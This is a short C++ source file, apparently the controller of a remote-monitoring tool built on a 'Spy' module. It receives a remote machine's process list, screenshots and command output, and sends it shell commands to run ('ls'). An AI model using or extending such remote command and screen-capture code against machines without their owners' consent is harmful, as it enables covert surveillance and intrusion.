#include <iostream>
#include <sstream>
#include <fstream>
#include <map>

#include "proto.hh"
#include "../Net.hh"
#include "../Spy/ScreenShot.hh"
#include "../Spy/Cmd.hh"

using namespace std;

namespace Observer {
  class session_on_observer : public Client_session {
  public:
    session_on_observer(int socket) : Client_session(socket) {
      proto = new proto_observer(socket);
      (*proto)["info"].sig_recv.connect(boost::bind(&session_on_observer::info, this, _1));
      (*proto)["list_proc"].sig_recv.connect(boost::bind(&session_on_observer::do_list_proc, this, _1));
      //(*proto)["screenshot"].sig_recv.connect(boost::bind(&session_on_observer::do_screenshot, this, _1));
      (*proto)["res_cmd"].sig_recv.connect(boost::bind(&session_on_observer::do_res_cmd, this, _1));

      //(*proto)["info"]("Le message //end//");
      //(*proto)["warning"]("err !! //end//");
      //(*proto)["get_list_proc"]("");
      //(*proto)["get_screenshot"]("0.3");
      (*proto)["send_cmd"]("ls //end//");
    }

    void info(string msg) {
      cout << "msg : " << msg << endl;
    }

    void do_list_proc(string data) {
      cout << "reception processus actifs" << endl;
      int size;
      stringstream ss(data);
      
      map<int, string> list;
      while(!ss.eof()) {
	int pid;
	string tmp;
	ss >> pid;
	ss >> tmp;
	list[pid] = tmp;
	
	cout << pid << " " << list[pid] << endl;
      }
    }

    void do_screenshot(string data) {
      stringstream ss(data);
      int w, h;
      ss >> w >> h;
      ScreenShot::build_bmp_fromStringstream("test.bmp", ss, w, h);
    }
    
    void do_res_cmd(string data) {
      cout << data << endl;
    }

  };
};

int main(int argc, char** argv) {
  Client <Observer::session_on_observer> client(argc, argv);
  client.join();
}
